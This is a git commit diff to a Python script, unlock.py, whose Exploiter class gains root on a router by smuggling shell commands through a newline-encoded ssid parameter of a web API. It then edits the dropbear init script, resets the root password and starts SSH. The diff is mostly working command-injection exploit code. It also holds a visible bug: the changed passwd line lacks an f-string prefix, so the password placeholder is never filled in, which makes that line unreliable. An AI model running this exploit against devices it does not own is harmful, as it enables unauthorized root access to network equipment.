8c1319e969da0dcc072bb76315962c08b1b2afeb
Oded Lazar <odlazar@microsoft.com>
2021-07-31 23:27:47 +0300

    unlock: fixes

--- scripts/unlock.py
+++ scripts/unlock.py
@@ -31,7 +31,7 @@ class Exploiter:
     def _run_cmd(self, command):
         r = requests.get(f"http://{self.gateway}/cgi-bin/luci/;stok={self.stok}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0A{urllib.parse.quote(command)}")
         r.raise_for_status()
-        res_code = r.json().get("code", "-1")
+        res_code = r.json().get("code", -1)
         if res_code != 0:
             raise ValueError(f"command returned code: {res_code}")
 
@@ -40,7 +40,7 @@ class Exploiter:
         self._run_cmd("nvram commit")
         self._run_cmd("cp /etc/init.d/dropbear /etc/init.d/dropbear_backup")
         self._run_cmd("sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear")
-        self._run_cmd("echo -e '12345678\n12345678' | passwd root")
+        self._run_cmd("echo -e '{self.ssh_password}\n{self.ssh_password}' | passwd root")
         self._run_cmd("/etc/init.d/dropbear enable")
         self._run_cmd("/etc/init.d/dropbear start")
 
@@ -52,7 +52,7 @@ if __name__ == "__main__":
     args = parse_arguments()
     exploiter = Exploiter(args.gateway, args.stok)
     if not exploiter.ok():
-        print("unable to perform exploit", file=sys.stderr)
+        print("unable to perform exploit: web interface isn't responding.", file=sys.stderr)
         sys.exit(1)
 
     exploiter.gain_root()
